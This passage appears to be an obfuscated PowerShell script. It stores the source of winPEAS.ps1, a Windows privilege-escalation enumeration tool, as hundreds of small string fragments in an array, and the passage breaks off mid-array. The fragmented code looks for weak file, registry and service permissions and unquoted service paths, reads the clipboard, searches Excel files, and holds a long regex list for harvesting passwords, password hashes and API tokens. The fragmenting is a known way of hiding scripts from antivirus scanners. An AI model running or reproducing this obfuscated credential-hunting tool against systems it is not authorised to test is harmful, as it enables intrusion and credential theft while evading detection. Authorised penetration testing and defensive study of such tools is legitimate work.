$fragments = @('<#
.SYNOPSIS
  Powe','rShell adaptation o','f WinPEAS.exe / Win','Peas.bat
.DESCRIPTI','ON
  For the legal ','enumeration of wind','ows based computers',' that you either ow','n or are approved t','o run this script o','n
.EXAMPLE
  # Defa','ult - normal operat','ion with username/p','assword audit in dr','ives/registry
  .\w','inPeas.ps1

  # Inc','lude Excel files in',' search: .xls, .xls','x, .xlsm
  .\winPea','s.ps1 -Excel

  # F','ull audit - normal ','operation with APIs',' / Keys / Tokens
  ','## This will produc','e false positives #','# 
  .\winPeas.ps1 ','-FullCheck 

  # Ad','d Time stamps to ea','ch command
  .\winP','eas.ps1 -TimeStamp
','
.NOTES
  Version: ','                   ','1.3
  PEASS-ng Orig','inal Author:   PEAS','S-ng
  winPEAS.ps1 ','Author:         @Ra','ndolphConley
  Crea','tion Date:         ','     10/4/2022
  We','bsite:             ','       https://gith','ub.com/peass-ng/PEA','SS-ng

  TESTED: Po','Sh 5,7
  UNTESTED: ','PoSh 3,4
  NOT FULL','Y COMPATIBLE: PoSh ','2 or lower
#>

####','###################','# FUNCTIONS #######','#################

','[CmdletBinding()]
p','aram(
  [switch]$Ti','meStamp,
  [switch]','$FullCheck,
  [swit','ch]$Excel
)

# Gath','er KB from all patc','hes installed
funct','ion returnHotFixID ','{
  param(
    [str','ing]$title
  )
  # ','Match on KB or if p','atch does not have ','a KB, return end re','sult
  if (($title ','| Select-String -Al','lMatches -Pattern ''','KB(\d{4,6})'').Match','es.Value) {
    ret','urn (($title | Sele','ct-String -AllMatch','es -Pattern ''KB(\d{','4,6})'').Matches.Val','ue)
  }
  elseif ((','$title | Select-Str','ing -NotMatch -Patt','ern ''KB(\d{4,6})'').','Matches.Value) {
  ','  return (($title |',' Select-String -Not','Match -Pattern ''KB(','\d{4,6})'').Matches.','Value)
  }
}

Funct','ion Start-ACLCheck ','{
  param(
    $Tar','get, $ServiceName)
','  # Gather ACL of o','bject
  if ($null -','ne $target) {
    t','ry {
      $ACLObje','ct = Get-Acl $targe','t -ErrorAction Sile','ntlyContinue
    }
','    catch { $null }','
    
    # If Foun','d, Evaluate Permiss','ions
    if ($ACLOb','ject) { 
      $Ide','ntity = @()
      $','Identity += "$env:C','OMPUTERNAME\$env:US','ERNAME"
      if ($','ACLObject.Owner -li','ke $Identity ) { Wr','ite-Host "$Identity',' has ownership of $','Target" -Foreground','Color Red }
      #',' This should now wo','rk for any language','. Command runs whoa','mi group, removes t','he first two line o','f output, converts ','from csv to object,',' but adds "group na','me" to the first co','lumn.
      whoami.','exe /groups /fo csv',' | select-object -s','kip 2 | ConvertFrom','-Csv -Header ''group',' name'' | Select-Obj','ect -ExpandProperty',' ''group name'' | For','Each-Object { $Iden','tity += $_ }
      ','$IdentityFound = $f','alse
      foreach ','($i in $Identity) {','
        $permissio','n = $ACLObject.Acce','ss | Where-Object {',' $_.IdentityReferen','ce -like $i }
     ','   $UserPermission ','= ""
        switch',' -WildCard ($Permis','sion.FileSystemRigh','ts) {
          "Fu','llControl" { $userP','ermission = "FullCo','ntrol"; $IdentityFo','und = $true }
     ','     "Write*" { $us','erPermission = "Wri','te"; $IdentityFound',' = $true }
        ','  "Modify" { $userP','ermission = "Modify','"; $IdentityFound =',' $true }
        }
','        Switch ($pe','rmission.RegistryRi','ghts) {
          "','FullControl" { $use','rPermission = "Full','Control"; $Identity','Found = $true }
   ','     }
        if (','$UserPermission) {
','          if ($Serv','iceName) { Write-Ho','st "$ServiceName fo','und with permission','s issue:" -Foregrou','ndColor Red }
     ','     Write-Host -Fo','regroundColor red  ','"Identity $($permis','sion.IdentityRefere','nce) has ''$userPerm','ission'' perms for $','Target"
        }
 ','     }    
      # ','Identity Found Chec','k - If False, loop ','through and stop at',' root of drive
    ','  if ($IdentityFoun','d -eq $false) {
   ','     if ($Target.Le','ngth -gt 3) {
     ','     $Target = Spli','t-Path $Target
    ','      Start-ACLChec','k $Target -ServiceN','ame $ServiceName
  ','      }
      }
   ',' }
    else {
     ',' # If not found, sp','lit path one level ','and Check again
   ','   $Target = Split-','Path $Target
      ','Start-ACLCheck $Tar','get $ServiceName
  ','  }
  }
}

Function',' UnquotedServicePat','hCheck {
  Write-Ho','st "Fetching the li','st of services, thi','s may take a while.','..";
  $services = ','Get-WmiObject -Clas','s Win32_Service | W','here-Object { $_.Pa','thName -inotmatch "','`"" -and $_.PathNam','e -inotmatch ":\\Wi','ndows\\" -and ($_.S','tartMode -eq "Auto"',' -or $_.StartMode -','eq "Manual") -and (','$_.State -eq "Runni','ng" -or $_.State -e','q "Stopped") };
  i','f ($($services | Me','asure-Object).Count',' -lt 1) {
    Write','-Host "No unquoted ','service paths were ','found";
  }
  else ','{
    $services | F','orEach-Object {
   ','   Write-Host "Unqu','oted Service Path f','ound!" -ForegroundC','olor red
      Writ','e-Host Name: $_.Nam','e
      Write-Host ','PathName: $_.PathNa','me
      Write-Host',' StartName: $_.Star','tName 
      Write-','Host StartMode: $_.','StartMode
      Wri','te-Host Running: $_','.State
    } 
  }
}','

function TimeElap','sed { Write-Host "T','ime Running: $($sto','pwatch.Elapsed.Minu','tes):$($stopwatch.E','lapsed.Seconds)" }
','Function Get-ClipBo','ardText {
  Add-Typ','e -AssemblyName Pre','sentationCore
  $te','xt = [Windows.Clipb','oard]::GetText()
  ','if ($text) {
    Wr','ite-Host ""
    if ','($TimeStamp) { Time','Elapsed }
    Write','-Host -ForegroundCo','lor Blue "=========','|| ClipBoard text f','ound:"
    Write-Ho','st $text
    
  }
}','

Function Search-E','xcel {
  [cmdletbin','ding()]
  Param (
 ','     [parameter(Man','datory, ValueFromPi','peline)]
      [Val','idateScript({
     ','     Try {
        ','      If (Test-Path',' -Path $_) {$True}
','              Else ','{Throw "$($_) is no','t a valid path!"}
 ','         }
        ','  Catch {
         ','     Throw $_
     ','     }
      })]
  ','    [string]$Source',',
      [parameter(','Mandatory)]
      [','string]$SearchText
','      #You can spec','ify wildcard charac','ters (*, ?)
  )
  $','Excel = New-Object ','-ComObject Excel.Ap','plication
  Try {
 ','     $Source = Conv','ert-Path $Source
  ','}
  Catch {
      W','rite-Warning "Unabl','e locate full path ','of $($Source)"
    ','  BREAK
  }
  $Work','book = $Excel.Workb','ooks.Open($Source)
','  ForEach ($Workshe','et in @($Workbook.S','heets)) {
      # F','ind Method https://','msdn.microsoft.com/','en-us/vba/excel-vba','/articles/range-fin','d-method-excel
    ','  $Found = $WorkShe','et.Cells.Find($Sear','chText)
      If ($','Found) {
        tr','y{  
          # Ad','dress Method https:','//msdn.microsoft.co','m/en-us/vba/excel-v','ba/articles/range-a','ddress-property-exc','el
          Write-','Host "Pattern: ''$Se','archText'' found in ','$source" -Foregroun','dColor Blue
       ','   $BeginAddress = ','$Found.Address(0,0,','1,1)
          #Ini','tial Found Cell
   ','       [pscustomobj','ect]@{
            ','  WorkSheet = $Work','sheet.Name
        ','      Column = $Fou','nd.Column
         ','     Row =$Found.Ro','w
              Tex','tMatch = $Found.Tex','t
              Add','ress = $BeginAddres','s
          }
     ','     Do {
         ','     $Found = $Work','Sheet.Cells.FindNex','t($Found)
         ','     $Address = $Fo','und.Address(0,0,1,1',')
              If ','($Address -eq $Begi','nAddress) {
       ','         Write-host',' "Address is same a','s Begin Address"
  ','                BRE','AK
              }
','              [pscu','stomobject]@{
     ','             WorkSh','eet = $Worksheet.Na','me
                ','  Column = $Found.C','olumn
             ','     Row =$Found.Ro','w
                 ',' TextMatch = $Found','.Text
             ','     Address = $Add','ress
              ','}                 
','          } Until (','$False)
        }
 ','       catch {
    ','      # Null expres','sion in Found
     ','   }
      }
      ','#Else {
      #    ','Write-Warning "[$($','WorkSheet.Name)] No','thing Found!"
     ',' #}
  }
  try{
  $w','orkbook.close($Fals','e)
  [void][System.','Runtime.InteropServ','ices.Marshal]::Rele','aseComObject([Syste','m.__ComObject]$exce','l)
  [gc]::Collect(',')
  [gc]::WaitForPe','ndingFinalizers()
 ',' }
  catch{
    #Us','ually an RPC error
','  }
  Remove-Variab','le excel -ErrorActi','on SilentlyContinue','
}

function Write-','Color([String[]]$Te','xt, [ConsoleColor[]',']$Color) {
  for ($','i = 0; $i -lt $Text','.Length; $i++) {
  ','  Write-Host $Text[','$i] -Foreground $Co','lor[$i] -NoNewline
','  }
  Write-Host
}
','
#Write-Color "    ','((,.,/(((((((((((((','(((((((/,  */" -Col','or Green
Write-Colo','r ",/*,..*(((((((((','(((((((((((((((((((','(((((," -Color Gree','n
Write-Color ",*/(','(((((((((((((((((/,','  .*//((//**, .*(((','(((*" -Color Green
','Write-Color "((((((','((((((((((", "* ***','**,,,", "\#########','# .(* ,((((((" -Col','or Green, Blue, Gre','en
Write-Color "(((','((((((((", "/******','*************", "##','##### .(. ((((((" -','Color Green, Blue, ','Green
Write-Color "','(((((((", "/*******','***********", "/@@@','@@/", "***", "\####','###\((((((" -Color ','Green, Blue, White,',' Blue, Green
Write-','Color ",,..", "****','******************"',', "/@@@@@@@@@/", "*','**", ",#####.\/((((','(" -Color Green, Bl','ue, White, Blue, Gr','een
Write-Color ", ',',", "**************','********", "/@@@@@+','@@@/", "*********",',' "##((/ /((((" -Col','or Green, Blue, Whi','te, Blue, Green
Wri','te-Color "..(((####','######", "*********','", "/#@@@@@@@@@/", ','"*************", ",',',..((((" -Color Gre','en, Blue, White, Bl','ue, Green
Write-Col','or ".(((###########','#####(/", "******",',' "/@@@@@/", "******','**********", ".. /(','(" -Color Green, Bl','ue, White, Blue, Gr','een
Write-Color ".(','(##################','######(/", "*******','*****************",',' "..*(" -Color Gree','n, Blue, Green
Writ','e-Color ".((#######','###################','###(/", "**********','**********", ".,(" ','-Color Green, Blue,',' Green
Write-Color ','".((###############','###################','(/", "*************','**", "..(" -Color G','reen, Blue, Green
W','rite-Color ".((####','###################','###############(/",',' "***********", "..','(" -Color Green, Bl','ue, Green
Write-Col','or ".((######", "(,','.***.,(", "########','###########", "(..*','**", "(/*********",',' "..(" -Color Green',', Green, Green, Gre','en, Blue, Green
Wri','te-Color ".((######','*", "(####((", "###','################", ','"((######", "/(****','****", "..(" -Color',' Green, Green, Gree','n, Green, Blue, Gre','en
Write-Color ".((','##################"',', "(/**********(", ','"################(*','*...(" -Color Green',', Green, Green
Writ','e-Color ".(((######','##############", "/','*******(", "#######','############.((((" ','-Color Green, Green',', Green
Write-Color',' ".(((((###########','###################','##############/  /(','(" -Color Green
Wri','te-Color "..(((((##','###################','###################','#(..(((((." -Color ','Green
Write-Color "','....(((((##########','###################','########( .((((((."',' -Color Green
Write','-Color "......(((((','###################','##############( .((','(((((." -Color Gree','n
Write-Color "((((','(((((. ,(##########','##################(','../(((((((((." -Col','or Green
Write-Colo','r "  (((((((((/,  ,','###################','#(/..((((((((((." -','Color Green
Write-C','olor "        (((((','((((/,.  ,*//////*,','. ./(((((((((((." -','Color Green
Write-C','olor "           ((','(((((((((((((((((((','((((((/" -Color Gre','en
Write-Color "   ','       by PEASS-ng ','& RandolphConley" -','Color Green

######','################## ','VARIABLES #########','###############

# ','Manually added Rege','x search strings fr','om https://github.c','om/peass-ng/PEASS-n','g/blob/master/build','_lists/sensitive_fi','les.yaml

# Set the','se values to true t','o add them to the r','egex search by defa','ult
$password = $tr','ue
$username = $tru','e
$webAuth = $true
','
$regexSearch = @{}','

if ($password) {
','  $regexSearch.add(','"Simple Passwords1"',', "pass.*[=:].+")
 ',' $regexSearch.add("','Simple Passwords2",',' "pwd.*[=:].+")
  $','regexSearch.add("Ap','r1 MD5", ''\$apr1\$[','a-zA-Z0-9_/\.]{8}\$','[a-zA-Z0-9_/\.]{22}',''')
  $regexSearch.a','dd("Apache SHA", "\','{SHA\}[0-9a-zA-Z/_=',']{10,}")
  $regexSe','arch.add("Blowfish"',', ''\$2[abxyz]?\$[0-','9]{2}\$[a-zA-Z0-9_/','\.]*'')
  $regexSear','ch.add("Drupal", ''\','$S\$[a-zA-Z0-9_/\.]','{52}'')
  $regexSear','ch.add("Joomlavbull','etin", "[0-9a-zA-Z]','{32}:[a-zA-Z0-9_]{1','6,32}")
  $regexSea','rch.add("Linux MD5"',', ''\$1\$[a-zA-Z0-9_','/\.]{8}\$[a-zA-Z0-9','_/\.]{22}'')
  $rege','xSearch.add("phpbb3','", ''\$H\$[a-zA-Z0-9','_/\.]{31}'')
  $rege','xSearch.add("sha512','crypt", ''\$6\$[a-zA','-Z0-9_/\.]{16}\$[a-','zA-Z0-9_/\.]{86}'')
','  $regexSearch.add(','"Wordpress", ''\$P\$','[a-zA-Z0-9_/\.]{31}',''')
  $regexSearch.a','dd("md5", "(^|[^a-z','A-Z0-9])[a-fA-F0-9]','{32}([^a-zA-Z0-9]|$',')")
  $regexSearch.','add("sha1", "(^|[^a','-zA-Z0-9])[a-fA-F0-','9]{40}([^a-zA-Z0-9]','|$)")
  $regexSearc','h.add("sha256", "(^','|[^a-zA-Z0-9])[a-fA','-F0-9]{64}([^a-zA-Z','0-9]|$)")
  $regexS','earch.add("sha512",',' "(^|[^a-zA-Z0-9])[','a-fA-F0-9]{128}([^a','-zA-Z0-9]|$)")  
  ','# This does not wor','k correctly
  #$reg','exSearch.add("Base3','2", "(?:[A-Z2-7]{8}',')*(?:[A-Z2-7]{2}={6','}|[A-Z2-7]{4}={4}|[','A-Z2-7]{5}={3}|[A-Z','2-7]{7}=)?")
  $reg','exSearch.add("Base6','4", "(eyJ|YTo|Tzo|P','D[89]|aHR0cHM6L|aHR','0cDo|rO0)[a-zA-Z0-9','+\/]+={0,2}")

}
if',' ($username) {
  $r','egexSearch.add("Use','rnames1", "username','[=:].+")
  $regexSe','arch.add("Usernames','2", "user[=:].+")
 ',' $regexSearch.add("','Usernames3", "login','[=:].+")
  $regexSe','arch.add("Emails", ','"[A-Za-z0-9._%+-]+@','[A-Za-z0-9.-]+\.[A-','Za-z]{2,6}")
  $reg','exSearch.add("Net u','ser add", "net user',' .+ /add")
}

if ($','FullCheck) {
  $reg','exSearch.add("Artif','actory API Token", ','"AKC[a-zA-Z0-9]{10,','}")
  $regexSearch.','add("Artifactory Pa','ssword", "AP[0-9ABC','DEF][a-zA-Z0-9]{8,}','")
  $regexSearch.a','dd("Adafruit API Ke','y", "([a-z0-9_-]{32','})")
  $regexSearch','.add("Adafruit API ','Key", "([a-z0-9_-]{','32})")
  $regexSear','ch.add("Adobe Clien','t Id (Oauth Web)", ','"(adobe[a-z0-9_ \.,','\-]{0,25})(=|>|:=|\','|\|:|<=|=>|:).{0,5}','[''""]([a-f0-9]{32})','[''""]")
  $regexSea','rch.add("Abode Clie','nt Secret", "(p8e-)','[a-z0-9]{32}")
  $r','egexSearch.add("Age',' Secret Key", "AGE-','SECRET-KEY-1[QPZRY9','X8GF2TVDW0S3JN54KHC','E6MUA7L]{58}")
  $r','egexSearch.add("Air','table API Key", "([','a-z0-9]{17})")
  $r','egexSearch.add("Alc','hemi API Key", "(al','chemi[a-z0-9_ \.,\-',']{0,25})(=|>|:=|\|\','|:|<=|=>|:).{0,5}[''','""]([a-zA-Z0-9-]{32','})[''""]")
  $regexS','earch.add("Artifact','ory API Key & Passw','ord", "[""'']AKC[a-z','A-Z0-9]{10,}[""'']|[','""'']AP[0-9ABCDEF][a','-zA-Z0-9]{8,}[""'']"',')
  $regexSearch.ad','d("Atlassian API Ke','y", "(atlassian[a-z','0-9_ \.,\-]{0,25})(','=|>|:=|\|\|:|<=|=>|',':).{0,5}[''""]([a-z0','-9]{24})[''""]")
  $','regexSearch.add("Bi','nance API Key", "(b','inance[a-z0-9_ \.,\','-]{0,25})(=|>|:=|\|','\|:|<=|=>|:).{0,5}[','''""]([a-zA-Z0-9]{64','})[''""]")
  $regexS','earch.add("Bitbucke','t Client Id", "((bi','tbucket[a-z0-9_ \.,','\-]{0,25})(=|>|:=|\','|\|:|<=|=>|:).{0,5}','[''""]([a-z0-9]{32})','[''""])")
  $regexSe','arch.add("Bitbucket',' Client Secret", "(','(bitbucket[a-z0-9_ ','\.,\-]{0,25})(=|>|:','=|\|\|:|<=|=>|:).{0',',5}[''""]([a-z0-9_\-',']{64})[''""])")
  $r','egexSearch.add("Bit','coinAverage API Key','", "(bitcoin.?avera','ge[a-z0-9_ \.,\-]{0',',25})(=|>|:=|\|\|:|','<=|=>|:).{0,5}[''""]','([a-zA-Z0-9]{43})[''','""]")
  $regexSearc','h.add("Bitquery API',' Key", "(bitquery[a','-z0-9_ \.,\-]{0,25}',')(=|>|:=|\|\|:|<=|=','>|:).{0,5}[''""]([A-','Za-z0-9]{32})[''""]"',')
  $regexSearch.ad','d("Bittrex Access K','ey and Access Key",',' "([a-z0-9]{32})")
','  $regexSearch.add(','"Birise API Key", "','(bitrise[a-z0-9_ \.',',\-]{0,25})(=|>|:=|','\|\|:|<=|=>|:).{0,5','}[''""]([a-zA-Z0-9_\','-]{86})[''""]")
  $r','egexSearch.add("Blo','ck API Key", "(bloc','k[a-z0-9_ \.,\-]{0,','25})(=|>|:=|\|\|:|<','=|=>|:).{0,5}[''""](','[a-z0-9]{4}-[a-z0-9',']{4}-[a-z0-9]{4}-[a','-z0-9]{4})[''""]")
 ',' $regexSearch.add("','Blockchain API Key"',', "mainnet[a-zA-Z0-','9]{32}|testnet[a-zA','-Z0-9]{32}|ipfs[a-z','A-Z0-9]{32}")
  $re','gexSearch.add("Bloc','kfrost API Key", "(','blockchain[a-z0-9_ ','\.,\-]{0,25})(=|>|:','=|\|\|:|<=|=>|:).{0',',5}[''""]([a-f0-9]{8','}-[a-f0-9]{4}-[a-f0','-9]{4}-[a-f0-9]{4}-','[0-9a-f]{12})[''""]"',')
  $regexSearch.ad','d("Box API Key", "(','box[a-z0-9_ \.,\-]{','0,25})(=|>|:=|\|\|:','|<=|=>|:).{0,5}[''""',']([a-zA-Z0-9]{32})[','''""]")
  $regexSear','ch.add("Bravenewcoi','n API Key", "(brave','newcoin[a-z0-9_ \.,','\-]{0,25})(=|>|:=|\','|\|:|<=|=>|:).{0,5}','[''""]([a-z0-9]{50})','[''""]")
  $regexSea','rch.add("Clearbit A','PI Key", "sk_[a-z0-','9]{32}")
  $regexSe','arch.add("Clojars A','PI Key", "(CLOJARS_',')[a-zA-Z0-9]{60}")
','  $regexSearch.add(','"Coinbase Access To','ken", "([a-z0-9_-]{','64})")
  $regexSear','ch.add("Coinlayer A','PI Key", "(coinlaye','r[a-z0-9_ \.,\-]{0,','25})(=|>|:=|\|\|:|<','=|=>|:).{0,5}[''""](','[a-z0-9]{32})[''""]"',')
  $regexSearch.ad','d("Coinlib API Key"',', "(coinlib[a-z0-9_',' \.,\-]{0,25})(=|>|',':=|\|\|:|<=|=>|:).{','0,5}[''""]([a-z0-9]{','16})[''""]")
  $rege','xSearch.add("Conflu','ent Access Token & ','Secret Key", "([a-z','0-9]{16})")
  $rege','xSearch.add("Conten','tful delivery API K','ey", "(contentful[a','-z0-9_ \.,\-]{0,25}',')(=|>|:=|\|\|:|<=|=','>|:).{0,5}[''""]([a-','z0-9=_\-]{43})[''""]','")
  $regexSearch.a','dd("Covalent API Ke','y", "ckey_[a-z0-9]{','27}")
  $regexSearc','h.add("Charity Sear','ch API Key", "(char','ity.?search[a-z0-9_',' \.,\-]{0,25})(=|>|',':=|\|\|:|<=|=>|:).{','0,5}[''""]([a-z0-9]{','32})[''""]")
  $rege','xSearch.add("Databr','icks API Key", "dap','i[a-h0-9]{32}")
  $','regexSearch.add("DD','ownload API Key", "','(ddownload[a-z0-9_ ','\.,\-]{0,25})(=|>|:','=|\|\|:|<=|=>|:).{0',',5}[''""]([a-z0-9]{2','2})[''""]")
  $regex','Search.add("Defined',' Networking API tok','en", "(dnkey-[a-z0-','9=_\-]{26}-[a-z0-9=','_\-]{52})")
  $rege','xSearch.add("Discor','d API Key, Client I','D & Client Secret",',' "((discord[a-z0-9_',' \.,\-]{0,25})(=|>|',':=|\|\|:|<=|=>|:).{','0,5}[''""]([a-h0-9]{','64}|[0-9]{18}|[a-z0','-9=_\-]{32})[''""])"',')
  $regexSearch.ad','d("Droneci Access T','oken", "([a-z0-9]{3','2})")
  $regexSearc','h.add("Dropbox API ','Key", "sl.[a-zA-Z0-','9_-]{136}")
  $rege','xSearch.add("Dopple','r API Key", "(dp\.p','t\.)[a-zA-Z0-9]{43}','")
  $regexSearch.a','dd("Dropbox API sec','ret/key, short & lo','ng lived API Key", ','"(dropbox[a-z0-9_ \','.,\-]{0,25})(=|>|:=','|\|\|:|<=|=>|:).{0,','5}[''""]([a-z0-9]{15','}|sl\.[a-z0-9=_\-]{','135}|[a-z0-9]{11}(A','AAAAAAAAA)[a-z0-9_=','\-]{43})[''""]")
  $','regexSearch.add("Du','ffel API Key", "duf','fel_(test|live)_[a-','zA-Z0-9_-]{43}")
  ','$regexSearch.add("D','ynatrace API Key", ','"dt0c01\.[a-zA-Z0-9',']{24}\.[a-z0-9]{64}','")
  $regexSearch.a','dd("EasyPost API Ke','y", "EZAK[a-zA-Z0-9',']{54}")
  $regexSea','rch.add("EasyPost t','est API Key", "EZTK','[a-zA-Z0-9]{54}")
 ',' $regexSearch.add("','Etherscan API Key",',' "(etherscan[a-z0-9','_ \.,\-]{0,25})(=|>','|:=|\|\|:|<=|=>|:).','{0,5}[''""]([A-Z0-9]','{34})[''""]")
  $reg','exSearch.add("Etsy ','Access Token", "([a','-z0-9]{24})")
  $re','gexSearch.add("Face','book Access Token",',' "EAACEdEose0cBA[0-','9A-Za-z]+")
  $rege','xSearch.add("Fastly',' API Key", "(fastly','[a-z0-9_ \.,\-]{0,2','5})(=|>|:=|\|\|:|<=','|=>|:).{0,5}[''""]([','a-z0-9=_\-]{32})[''"','"]")
  $regexSearch','.add("Finicity API ','Key & Client Secret','", "(finicity[a-z0-','9_ \.,\-]{0,25})(=|','>|:=|\|\|:|<=|=>|:)','.{0,5}[''""]([a-f0-9',']{32}|[a-z0-9]{20})','[''""]")
  $regexSea','rch.add("Flickr Acc','ess Token", "([a-z0','-9]{32})")
  $regex','Search.add("Flutter','weave Keys", "FLWPU','BK_TEST-[a-hA-H0-9]','{32}-X|FLWSECK_TEST','-[a-hA-H0-9]{32}-X|','FLWSECK_TEST[a-hA-H','0-9]{12}")
  $regex','Search.add("Frame.i','o API Key", "fio-u-','[a-zA-Z0-9_=\-]{64}','")
  $regexSearch.a','dd("Freshbooks Acce','ss Token", "([a-z0-','9]{64})")
  $regexS','earch.add("Github",',' "github(.{0,20})?[','''""][0-9a-zA-Z]{35,','40}")
  $regexSearc','h.add("Github App T','oken", "(ghu|ghs)_[','0-9a-zA-Z]{36}")
  ','$regexSearch.add("G','ithub OAuth Access ','Token", "gho_[0-9a-','zA-Z]{36}")
  $rege','xSearch.add("Github',' Personal Access To','ken", "ghp_[0-9a-zA','-Z]{36}")
  $regexS','earch.add("Github R','efresh Token", "ghr','_[0-9a-zA-Z]{76}")
','  $regexSearch.add(','"GitHub Fine-Graine','d Personal Access T','oken", "github_pat_','[0-9a-zA-Z_]{82}")
','  $regexSearch.add(','"Gitlab Personal Ac','cess Token", "glpat','-[0-9a-zA-Z\-]{20}"',')
  $regexSearch.ad','d("GitLab Pipeline ','Trigger Token", "gl','ptt-[0-9a-f]{40}")
','  $regexSearch.add(','"GitLab Runner Regi','stration Token", "G','R1348941[0-9a-zA-Z_','\-]{20}")
  $regexS','earch.add("Gitter A','ccess Token", "([a-','z0-9_-]{40})")
  $r','egexSearch.add("GoC','ardless API Key", "','live_[a-zA-Z0-9_=\-',']{40}")
  $regexSea','rch.add("GoFile API',' Key", "(gofile[a-z','0-9_ \.,\-]{0,25})(','=|>|:=|\|\|:|<=|=>|',':).{0,5}[''""]([a-zA','-Z0-9]{32})[''""]")
','  $regexSearch.add(','"Google API Key", "','AIza[0-9A-Za-z_\-]{','35}")
  $regexSearc','h.add("Google Cloud',' Platform API Key",',' "(google|gcp|youtu','be|drive|yt)(.{0,20','})?[''""][AIza[0-9a-','z_\-]{35}][''""]")
 ',' $regexSearch.add("','Google Drive Oauth"',', "[0-9]+-[0-9A-Za-','z_]{32}\.apps\.goog','leusercontent\.com"',')
  $regexSearch.ad','d("Google Oauth Acc','ess Token", "ya29\.','[0-9A-Za-z_\-]+")
 ',' $regexSearch.add("','Google (GCP) Servic','e-account", """type','.+:.+""service_acco','unt")
  $regexSearc','h.add("Grafana API ','Key", "eyJrIjoi[a-z','0-9_=\-]{72,92}")
 ',' $regexSearch.add("','Grafana cloud api t','oken", "glc_[A-Za-z','0-9\+/]{32,}={0,2}"',')
  $regexSearch.ad','d("Grafana service ','account token", "(g','lsa_[A-Za-z0-9]{32}','_[A-Fa-f0-9]{8})")
','  $regexSearch.add(','"Hashicorp Terrafor','m user/org API Key"',', "[a-z0-9]{14}\.at','lasv1\.[a-z0-9_=\-]','{60,70}")
  $regexS','earch.add("Heroku A','PI Key", "[hH][eE][','rR][oO][kK][uU].{0,','30}[0-9A-F]{8}-[0-9','A-F]{4}-[0-9A-F]{4}','-[0-9A-F]{4}-[0-9A-','F]{12}")
  $regexSe','arch.add("Hubspot A','PI Key", "[''""][a-h','0-9]{8}-[a-h0-9]{4}','-[a-h0-9]{4}-[a-h0-','9]{4}-[a-h0-9]{12}[','''""]")
  $regexSear','ch.add("Instatus AP','I Key", "(instatus[','a-z0-9_ \.,\-]{0,25','})(=|>|:=|\|\|:|<=|','=>|:).{0,5}[''""]([a','-z0-9]{32})[''""]")
','  $regexSearch.add(','"Intercom API Key &',' Client Secret/ID",',' "(intercom[a-z0-9_',' \.,\-]{0,25})(=|>|',':=|\|\|:|<=|=>|:).{','0,5}[''""]([a-z0-9=_',']{60}|[a-h0-9]{8}-[','a-h0-9]{4}-[a-h0-9]','{4}-[a-h0-9]{4}-[a-','h0-9]{12})[''""]")
 ',' $regexSearch.add("','Ionic API Key", "(i','onic[a-z0-9_ \.,\-]','{0,25})(=|>|:=|\|\|',':|<=|=>|:).{0,5}[''"','"](ion_[a-z0-9]{42}',')[''""]")
  $regexSe','arch.add("JSON Web ','Token", "(ey[0-9a-z',']{30,34}\.ey[0-9a-z','\/_\-]{30,}\.[0-9a-','zA-Z\/_\-]{10,}={0,','2})")
  $regexSearc','h.add("Kraken Acces','s Token", "([a-z0-9','\/=_\+\-]{80,90})")','
  $regexSearch.add','("Kucoin Access Tok','en", "([a-f0-9]{24}',')")
  $regexSearch.','add("Kucoin Secret ','Key", "([0-9a-f]{8}','-[0-9a-f]{4}-[0-9a-','f]{4}-[0-9a-f]{4}-[','0-9a-f]{12})")
  $r','egexSearch.add("Lau','nchdarkly Access To','ken", "([a-z0-9=_\-',']{40})")
  $regexSe','arch.add("Linear AP','I Key", "(lin_api_[','a-zA-Z0-9]{40})")
 ',' $regexSearch.add("','Linear Client Secre','t/ID", "((linear[a-','z0-9_ \.,\-]{0,25})','(=|>|:=|\|\|:|<=|=>','|:).{0,5}[''""]([a-f','0-9]{32})[''""])")
 ',' $regexSearch.add("','LinkedIn Client ID"',', "linkedin(.{0,20}',')?[''""][0-9a-z]{12}','[''""]")
  $regexSea','rch.add("LinkedIn S','ecret Key", "linked','in(.{0,20})?[''""][0','-9a-z]{16}[''""]")
 ',' $regexSearch.add("','Lob API Key", "((lo','b[a-z0-9_ \.,\-]{0,','25})(=|>|:=|\|\|:|<','=|=>|:).{0,5}[''""](','(live|test)_[a-f0-9',']{35})[''""])|((lob[','a-z0-9_ \.,\-]{0,25','})(=|>|:=|\|\|:|<=|','=>|:).{0,5}[''""]((t','est|live)_pub_[a-f0','-9]{31})[''""])")
  ','$regexSearch.add("L','ob Publishable API ','Key", "((test|live)','_pub_[a-f0-9]{31})"',')
  $regexSearch.ad','d("MailboxValidator','", "(mailbox.?valid','ator[a-z0-9_ \.,\-]','{0,25})(=|>|:=|\|\|',':|<=|=>|:).{0,5}[''"','"]([A-Z0-9]{20})[''"','"]")
  $regexSearch','.add("Mailchimp API',' Key", "[0-9a-f]{32','}-us[0-9]{1,2}")
  ','$regexSearch.add("M','ailgun API Key", "k','ey-[0-9a-zA-Z]{32}''','")
  $regexSearch.a','dd("Mailgun Public ','Validation Key", "p','ubkey-[a-f0-9]{32}"',')
  $regexSearch.ad','d("Mailgun Webhook ','signing key", "[a-h','0-9]{32}-[a-h0-9]{8','}-[a-h0-9]{8}")
  $','regexSearch.add("Ma','pbox API Key", "(pk','\.[a-z0-9]{60}\.[a-','z0-9]{22})")
  $reg','exSearch.add("Matte','rmost Access Token"',', "([a-z0-9]{26})")','
  $regexSearch.add','("MessageBird API K','ey & API client ID"',', "(messagebird[a-z','0-9_ \.,\-]{0,25})(','=|>|:=|\|\|:|<=|=>|',':).{0,5}[''""]([a-z0','-9]{25}|[a-h0-9]{8}','-[a-h0-9]{4}-[a-h0-','9]{4}-[a-h0-9]{4}-[','a-h0-9]{12})[''""]")','
  $regexSearch.add','("Microsoft Teams W','ebhook", "https:\/\','/[a-z0-9]+\.webhook','\.office\.com\/webh','ookb2\/[a-z0-9]{8}-','([a-z0-9]{4}-){3}[a','-z0-9]{12}@[a-z0-9]','{8}-([a-z0-9]{4}-){','3}[a-z0-9]{12}\/Inc','omingWebhook\/[a-z0','-9]{32}\/[a-z0-9]{8','}-([a-z0-9]{4}-){3}','[a-z0-9]{12}")
  $r','egexSearch.add("Moj','oAuth API Key", "[a','-f0-9]{8}-[a-f0-9]{','4}-[a-f0-9]{4}-[a-f','0-9]{4}-[a-f0-9]{12','}")
  $regexSearch.','add("Netlify Access',' Token", "([a-z0-9=','_\-]{40,46})")
